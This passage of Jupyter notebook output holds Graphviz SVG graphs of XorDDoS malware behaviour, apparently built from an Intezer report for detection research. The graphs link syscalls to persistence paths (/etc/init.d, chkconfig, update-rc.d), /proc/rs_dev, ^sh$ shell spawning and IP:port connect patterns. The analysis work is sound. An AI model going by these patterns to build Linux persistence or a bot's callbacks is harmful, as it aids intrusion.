3329.69,-229 3342.73,-223.45 3354.51,-213.18 3363.63,-203.38\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3366.38,-205.55 3370.35,-195.73 3361.12,-200.93 3366.38,-205.55\"/>\n<text text-anchor=\"middle\" x=\"3371.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">7.lseek</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge47\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.97,-263.36C2884.56,-261.4 3367.81,-253.98 3391.69,-229 3397.65,-222.77 3397.74,-214 3395.58,-205.55\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3398.83,-204.23 3392.23,-195.94 3392.22,-206.54 3398.83,-204.23\"/>\n<text text-anchor=\"middle\" x=\"3421.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">11.clone</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge48\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.17,-263.62C2895.1,-262.24 3423.75,-256.05 3449.69,-229 3461.24,-216.96 3448.9,-205.65 3431.81,-196.84\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3433.07,-193.57 3422.53,-192.47 3430.09,-199.9 3433.07,-193.57\"/>\n<text text-anchor=\"middle\" x=\"3473.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">9.write</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge49\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.95,-263.8C2902.71,-262.88 3469.06,-257.75 3496.69,-229 3516.25,-208.65 3486.18,-196.05 3452.03,-188.59\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3452.33,-185.08 3441.84,-186.53 3450.94,-191.94 3452.33,-185.08\"/>\n<text text-anchor=\"middle\" x=\"3523.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.open</text>\n</g>\n<!-- 13 -->\n<g id=\"node14\" class=\"node\">\n<title>13</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3641.69\" cy=\"-178\" rx=\"38.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3641.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/selinux</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge50\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.66,-263.06C2900.93,-260.26 3465.38,-250.72 3546.69,-229 3570,-222.77 3594.02,-210.06 3612.08,-199.01\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3614.35,-201.72 3620.94,-193.43 3610.62,-195.8 3614.35,-201.72\"/>\n<text text-anchor=\"middle\" x=\"3613.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">40.access</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge51\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.1,-264.27C2926.89,-264.71 3611.75,-263.08 3644.69,-229 3650.53,-222.95 3651.53,-214.34 3650.52,-205.97\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3653.92,-205.14 3648.47,-196.05 3647.07,-206.56 3653.92,-205.14\"/>\n<text text-anchor=\"middle\" x=\"3674.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">39.statfs</text>\n</g>\n<!-- 14 -->\n<g id=\"node15\" class=\"node\">\n<title>14</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3748.69\" cy=\"-91\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3748.69\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/openrc</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge52\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.12,-263.91C2934.93,-263.32 3662.31,-259.04 3702.69,-229 3736.87,-203.57 3745.95,-151.6 3748.18,-119.49\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3751.68,-119.59 3748.7,-109.42 3744.69,-119.23 3751.68,-119.59\"/>\n<text text-anchor=\"middle\" x=\"3761.19\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">31.stat</text>\n</g>\n<!-- 15 -->\n<g id=\"node16\" class=\"node\">\n<title>15</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3882.69\" cy=\"-178\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3882.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;15 -->\n<g id=\"edge53\" class=\"edge\">\n<title>Start&#45;&gt;15</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.13,-264.05C2933.81,-263.88 3658.74,-260.7 3759.69,-229 3771.33,-225.34 3771.74,-219.39 3782.69,-214 3803.77,-203.63 3828.71,-194.89 3848.41,-188.74\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3849.64,-192.03 3858.19,-185.77 3847.6,-185.33 3849.64,-192.03\"/>\n<text text-anchor=\"middle\" x=\"3804.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.stat64</text>\n</g>\n<!-- Start&#45;&gt;15 -->\n<g id=\"edge54\" class=\"edge\">\n<title>Start&#45;&gt;15</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.07,-263.22C2951.89,-260.43 3774.05,-249.96 3826.69,-229 3834.66,-225.83 3849.25,-212.69 3861.53,-200.68\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3864.19,-202.98 3868.81,-193.44 3859.25,-198.01 3864.19,-202.98\"/>\n<text text-anchor=\"middle\" x=\"3870.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">58.lseek</text>\n</g>\n<!-- Start&#45;&gt;15 -->\n<g id=\"edge55\" class=\"edge\">\n<title>Start&#45;&gt;15</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.87,-263.33C2966.45,-260.77 3874.63,-250.65 3895.69,-229 3902.12,-222.39 3901.29,-213.03 3897.99,-204.18\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3901.08,-202.53 3893.67,-194.95 3894.74,-205.49 3901.08,-202.53\"/>\n<text text-anchor=\"middle\" x=\"3923.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">61.write</text>\n</g>\n<!-- Start&#45;&gt;15 -->\n<g id=\"edge56\" class=\"edge\">\n<title>Start&#45;&gt;15</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.2,-263.41C2974.7,-261.1 3927.65,-251.62 3949.69,-229 3964.64,-213.65 3940.06,-199.37 3916.57,-190.04\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3917.62,-186.69 3907.03,-186.47 3915.17,-193.25 3917.62,-186.69\"/>\n<text text-anchor=\"middle\" x=\"3977.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">53.open</text>\n</g>\n<!-- 16 -->\n<g id=\"node17\" class=\"node\">\n<title>16</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4046.69\" cy=\"-18\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4046.69\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/insserv</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge57\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.76,-263.35C2980.88,-260.76 3979.42,-250.25 4004.69,-229 4058.16,-184.02 4055.76,-91.91 4050.7,-46.1\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4054.16,-45.53 4049.46,-36.03 4047.21,-46.38 4054.16,-45.53\"/>\n<text text-anchor=\"middle\" x=\"4070.19\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.stat</text>\n</g>\n<!-- 17 -->\n<g id=\"node18\" class=\"node\">\n<title>17</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4153.69\" cy=\"-178\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4153.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;17 -->\n<g id=\"edge58\" class=\"edge\">\n<title>Start&#45;&gt;17</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.75,-263.3C2982.32,-260.5 3992.18,-249.34 4057.69,-229 4069.34,-225.38 4070.05,-219.98 4080.69,-214 4092.19,-207.53 4105.08,-201.1 4116.78,-195.54\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4118.29,-198.7 4125.87,-191.3 4115.33,-192.36 4118.29,-198.7\"/>\n<text text-anchor=\"middle\" x=\"4103.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">57.lseek</text>\n</g>\n<!-- Start&#45;&gt;17 -->\n<g id=\"edge59\" class=\"edge\">\n<title>Start&#45;&gt;17</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.02,-264.35C2992.86,-265.45 4065.13,-266.69 4126.69,-229 4135.34,-223.7 4141.4,-214.6 4145.55,-205.59\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4148.9,-206.64 4149.34,-196.05 4142.39,-204.05 4148.9,-206.64\"/>\n<text text-anchor=\"middle\" x=\"4162.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">60.write</text>\n</g>\n<!-- Start&#45;&gt;17 -->\n<g id=\"edge60\" class=\"edge\">\n<title>Start&#45;&gt;17</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.05,-263.73C3005.93,-262.48 4162.27,-256.01 4188.69,-229 4197.07,-220.43 4191.21,-209.67 4182.05,-200.32\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4184.33,-197.67 4174.59,-193.52 4179.62,-202.84 4184.33,-197.67\"/>\n<text text-anchor=\"middle\" x=\"4215.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">52.open</text>\n</g>\n<!-- Start&#45;&gt;17 -->\n<g id=\"edge61\" class=\"edge\">\n<title>Start&#45;&gt;17</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.98,-263.79C3012.56,-262.76 4215.28,-257.01 4242.69,-229 4247.35,-224.24 4246.44,-219.51 4242.69,-214 4239.66,-209.55 4216.82,-200.61 4195.04,-192.89\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4196.11,-189.55 4185.51,-189.55 4193.8,-196.16 4196.11,-189.55\"/>\n<text text-anchor=\"middle\" x=\"4271.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.stat64</text>\n</g>\n<!-- 18 -->\n<g id=\"node19\" class=\"node\">\n<title>18</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4275.69\" cy=\"-178\" rx=\"57.69\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4275.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/rs_dev</text>\n</g>\n<!-- Start&#45;&gt;18 -->\n<g id=\"edge62\" class=\"edge\">\n<title>Start&#45;&gt;18</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.96,-263.85C3019.68,-263.05 4272.21,-258.08 4300.69,-229 4307.69,-221.85 4305,-212.36 4299.29,-203.56\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4301.95,-201.28 4293.11,-195.44 4296.38,-205.52 4301.95,-201.28\"/>\n<text text-anchor=\"middle\" x=\"4327.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.open</text>\n</g>\n<!-- 19 -->\n<g id=\"node20\" class=\"node\">\n<title>19</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4364.69\" cy=\"-91\" rx=\"52.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4364.69\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">update&#45;rc.d</text>\n</g>\n<!-- Start&#45;&gt;19 -->\n<g id=\"edge63\" class=\"edge\">\n<title>Start&#45;&gt;19</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.13,-263.85C3026.53,-263.03 4324.15,-257.97 4354.69,-229 4383.91,-201.28 4378.93,-150.5 4372.15,-119.16\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4375.54,-118.26 4369.83,-109.33 4368.72,-119.87 4375.54,-118.26\"/>\n<text text-anchor=\"middle\" x=\"4400.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">28.clone</text>\n</g>\n<!-- 20 -->\n<g id=\"node21\" class=\"node\">\n<title>20</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4445.69\" cy=\"-18\" rx=\"29.5\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4445.69\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/perl/</text>\n</g>\n<!-- Start&#45;&gt;20 -->\n<g id=\"edge64\" class=\"edge\">\n<title>Start&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.82,-263.57C3021.48,-261.6 4292.01,-252.5 4373.69,-229 4401.08,-221.12 4413.47,-220.11 4428.69,-196 4457.86,-149.79 4454.82,-82.85 4450.16,-45.95\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4453.62,-45.37 4448.77,-35.95 4446.68,-46.33 4453.62,-45.37\"/>\n<text text-anchor=\"middle\" x=\"4469.19\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.stat</text>\n</g>\n<!-- 21 -->\n<g id=\"node22\" class=\"node\">\n<title>21</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4510.69\" cy=\"-178\" rx=\"37.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4510.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/sed</text>\n</g>\n<!-- Start&#45;&gt;21 -->\n<g id=\"edge65\" class=\"edge\">\n<title>Start&#45;&gt;21</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.03,-264.12C3032.48,-264.46 4377.18,-263.62 4459.69,-229 4472.68,-223.55 4484.19,-213.09 4492.97,-203.14\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4495.72,-205.3 4499.4,-195.37 4490.33,-200.84 4495.72,-205.3\"/>\n<text text-anchor=\"middle\" x=\"4500.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">37.stat</text>\n</g>\n<!-- 22 -->\n<g id=\"node23\" class=\"node\">\n<title>22</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4583.69\" cy=\"-91\" rx=\"100.98\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4583.69\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">permission(s|:)[0&#45;9]{1,4}</text>\n</g>\n<!-- Start&#45;&gt;22 -->\n<g id=\"edge66\" class=\"edge\">\n<title>Start&#45;&gt;22</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.04,-264.17C3039.68,-264.7 4437.04,-264.65 4522.69,-229 4564.73,-211.5 4577.8,-153.96 4581.86,-119.26\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4585.34,-119.6 4582.85,-109.3 4578.38,-118.9 4585.34,-119.6\"/>\n<text text-anchor=\"middle\" x=\"4599.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">42.umask</text>\n</g>\n<!-- 23 -->\n<g id=\"node24\" class=\"node\">\n<title>23</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4804.69\" cy=\"-178\" rx=\"148.67\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4804.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">d{1,3}.d{1,3}.d{1,3}.d{1,3}:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;23 -->\n<g id=\"edge67\" class=\"edge\">\n<title>Start&#45;&gt;23</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.87,-263.54C3047.05,-261.31 4503.51,-250.85 4597.69,-229 4612.99,-225.45 4614.77,-218.91 4629.69,-214 4653.98,-206.01 4680.8,-199.53 4706,-194.42\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4706.8,-197.83 4715.93,-192.46 4705.45,-190.96 4706.8,-197.83\"/>\n<text text-anchor=\"middle\" x=\"4651.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">63.send</text>\n</g>\n<!-- Start&#45;&gt;23 -->\n<g id=\"edge68\" class=\"edge\">\n<title>Start&#45;&gt;23</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.12,-263.7C3056.16,-262.18 4576.29,-254.33 4673.69,-229 4687.35,-225.45 4688.74,-219.62 4701.69,-214 4714.72,-208.34 4728.99,-202.98 4742.65,-198.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4744.11,-201.44 4752.45,-194.9 4741.86,-194.81 4744.11,-201.44\"/>\n<text text-anchor=\"middle\" x=\"4741.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">65._newselect</text>\n</g>\n<!-- Start&#45;&gt;23 -->\n<g id=\"edge69\" class=\"edge\">\n<title>Start&#45;&gt;23</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.89,-263.86C3073.74,-263.02 4735.85,-257.72 4780.69,-229 4789.03,-223.66 4794.54,-214.54 4798.15,-205.55\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4801.48,-206.61 4801.36,-196.02 4794.85,-204.37 4801.48,-206.61\"/>\n<text text-anchor=\"middle\" x=\"4823.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">67.connect</text>\n</g>\n<!-- 24 -->\n<g id=\"node25\" class=\"node\">\n<title>24</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4998.69\" cy=\"-178\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4998.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sh$</text>\n</g>\n<!-- Start&#45;&gt;24 -->\n<g id=\"edge70\" class=\"edge\">\n<title>Start&#45;&gt;24</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.16,-264.14C3063.19,-264.61 4641.78,-264.51 4858.69,-229 4880.33,-225.46 4884.79,-220.63 4905.69,-214 4931.01,-205.96 4937.95,-205.69 4962.69,-196 4964.52,-195.28 4966.4,-194.51 4968.27,-193.71\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4969.88,-196.83 4977.58,-189.55 4967.02,-190.44 4969.88,-196.83\"/>\n<text text-anchor=\"middle\" x=\"4934.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">24.waitpid</text>\n</g>\n<!-- Start&#45;&gt;24 -->\n<g id=\"edge71\" class=\"edge\">\n<title>Start&#45;&gt;24</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.95,-263.81C3092.99,-262.7 4912.4,-256.19 4963.69,-229 4973.76,-223.66 4981.55,-213.97 4987.2,-204.54\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4990.29,-206.18 4991.96,-195.72 4984.13,-202.86 4990.29,-206.18\"/>\n<text text-anchor=\"middle\" x=\"5003.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">23.clone</text>\n</g>\n<!-- 25 -->\n<g id=\"node26\" class=\"node\">\n<title>25</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"5053.69\" cy=\"-18\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"5053.69\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^pipe($|.|$)</text>\n</g>\n<!-- Start&#45;&gt;25 -->\n<g id=\"edge72\" class=\"edge\">\n<title>Start&#45;&gt;25</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.91,-263.57C3103.17,-261.22 5009.58,-249.2 5031.69,-229 5082.42,-182.64 5070.65,-91.56 5060.71,-46.12\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"5064.06,-45.07 5058.39,-36.12 5057.24,-46.65 5064.06,-45.07\"/>\n<text text-anchor=\"middle\" x=\"5089.69\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">34.pipe</text>\n</g>\n<!-- 26 -->\n<g id=\"node27\" class=\"node\">\n<title>26</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"5136.69\" cy=\"-178\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"5136.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;26 -->\n<g id=\"edge73\" class=\"edge\">\n<title>Start&#45;&gt;26</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.14,-264.21C3097.54,-265.13 4952.54,-267.25 5067.69,-229 5084.39,-223.45 5100.47,-212.27 5112.89,-201.88\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"5115.27,-204.45 5120.5,-195.24 5110.67,-199.18 5115.27,-204.45\"/>\n<text text-anchor=\"middle\" x=\"5119.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.clone</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.sources.Source at 0x263ffee87c0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Intezer.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"582pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 582.14 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 578.14,-127 578.14,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"33.34\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"33.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M63.33,-87.22C59.1,-81.66 54.71,-75.27 51.34,-69 47.46,-61.76 44.1,-53.52 41.38,-45.83\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"44.64,-44.57 38.16,-36.19 38,-46.79 44.64,-44.57\"/>\n<text text-anchor=\"middle\" x=\"75.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.extract</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"122.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"122.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M89.4,-86.91C93.11,-81.32 97.08,-75 100.34,-69 104.42,-61.5 108.35,-53.1 111.73,-45.35\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"115.01,-46.57 115.69,-36 108.57,-43.84 115.01,-46.57\"/>\n<text text-anchor=\"middle\" x=\"139.34\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.hardcode</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"219.34\" cy=\"-105\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"219.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"331.34\" cy=\"-105\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"331.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">GID($|.|$)</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"442.34\" cy=\"-105\" rx=\"46.29\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"442.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">UID($|.|$)</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"540.34\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"540.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x263ffeeb1f0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Intezer.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M77.34,-86.8C77.34,-75.16 77.34,-59.55 77.34,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"80.84,-46.18 77.34,-36.18 73.84,-46.18 80.84,-46.18\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.extract</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x263ffee97e0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Intezer.csv\n"
     ]
    },
    {
     "data": {
